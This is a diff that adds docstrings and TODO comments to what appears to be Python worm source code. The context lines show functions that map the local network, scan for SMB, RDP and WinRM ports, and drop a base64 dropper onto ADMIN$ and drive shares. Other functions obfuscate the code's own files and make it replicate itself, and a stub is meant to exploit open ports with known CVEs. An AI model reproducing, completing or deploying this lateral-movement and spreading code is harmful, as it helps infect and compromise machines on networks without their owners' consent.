@@ -15,6 +15,11 @@ import re
 import shutil
 
 def get_lan() -> set:
+    """
+    this function should return set of address of "nearby" ip by lan.
+    //TODO: find better way to to this
+    //TODO: WHY DA FUCK ONLY 192.168 OR 172.16?
+    """
     interfaces = netifaces.interfaces()
     local_ip = set()
     for interface in interfaces:
@@ -30,6 +35,13 @@ def get_lan() -> set:
 
 
 def get_vuln_ports() -> dict:
+    """
+    This function should "scan" for open ports from the vuln_ports set.
+    this is kind'a fucked up and would probably too noisy.
+    the function return dict of {ip: "open_port,open_port"}
+    //TODO: make it return list of port instead of string.
+    //TODO: nmap ? XMAS? just find better way
+    """
     vuln_ports = {'445', '3389', '5985'}
     clients = []
     vuln = dict()
@@ -51,6 +63,10 @@ def get_vuln_ports() -> dict:
 
 
 def abuse_open_ports():
+    """
+    abuse the open ports with known CVE.
+    //TODO: Create this
+    """
     smb = '445'
     mstsc = '3389'
     ports = get_vuln_ports()
@@ -66,13 +82,17 @@ def abuse_open_ports():
     return
 
 
-def drop_on_share(ip, file,port=445) -> None:
+def drop_on_share(ip : str, file,port=445) -> None:
     """
 
     :param ip: ip to parse
     :param file: base64 dropper
     :param port: 445
     :return: None
+
+    so, we want to "explore" any existing or accessible share we got on the network.
+    we can probably find much better way to do this
+    //TODO: find better way to do this.
     """
     default_shares = [l + '$' for l in string.ascii_uppercase]
     default_shares.append('ADMIN$')
@@ -99,7 +119,8 @@ def drop_on_share(ip, file,port=445) -> None:
 
 
 def obfuscate_files(files_path):
-    """obfuscate_all_files"""
+    """obfuscate_all_files
+    //TODO: we dont use this function anymore, remove ASAP as we use the Persistance module to do that."""
     functions = {}
     vars2 = {}
     replace_it = {'base64': random_string(random.randrange(6, 22)),
@@ -138,6 +159,10 @@ def obfuscate_files(files_path):
                     code = code.replace(k.name, v)
 
 def replicate():
+    """
+    we also don't use this func, but we will take the whole idea from here and re create it.
+    so for now, ignore
+    """
     global application_path, temp_dir
     if getattr(sys, 'frozen', False):
         # If the application is run as a bundle, the PyInstaller bootloader
